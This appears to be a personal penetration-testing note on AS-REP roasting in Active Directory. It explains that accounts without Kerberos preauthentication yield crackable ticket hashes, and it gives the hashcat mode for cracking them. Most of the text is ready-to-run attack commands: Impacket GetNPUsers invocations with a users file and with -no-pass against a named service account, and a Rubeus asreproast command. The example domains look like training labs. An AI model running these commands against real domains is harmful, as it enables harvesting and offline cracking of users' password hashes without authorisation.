AS-REP roasting is a technique that allows retrieving password hashes for users that have `Do not require Kerberos preauthentication` property selected. This means that the *DC gives the Ticket without the user having to provide their password*.
The Kerberos ticket is hashed with password of the user.

![[Pasted image 20230710213612.png]]

Hashcat: 18200
# Attack Tools
### Impacket
**GetNPUsers.py** script will attempt to list and get TGTs for those users that have the property `Do not require Kerberos pre-authentication` set (UF_DONT_REQUIRE_PREAUTH). For those users with such configuration, a John the Ripper output will be generated so you can send it for cracking.

```sh
impacket-GetNPUsers -dc-ip 192.168.1.105 ignite.local/ -usersfile users.txt -request -format john -outputfile hashes

# -dc-ip : IP Address of DC
# -usersfile : File with users to enumerate
# ignite.local: Domain name
```

If we already know the **username** & there's no password for that user :-
```sh
./GetNPUsers.py spookysec.local/svc-admin -no-pass

# svc-admin : Username
# Make sure to Add a DNS to map the domain name to it's IP Address
```

## Rubeus
```cmd
.\Rubeus.exe asreproast /nowrap
```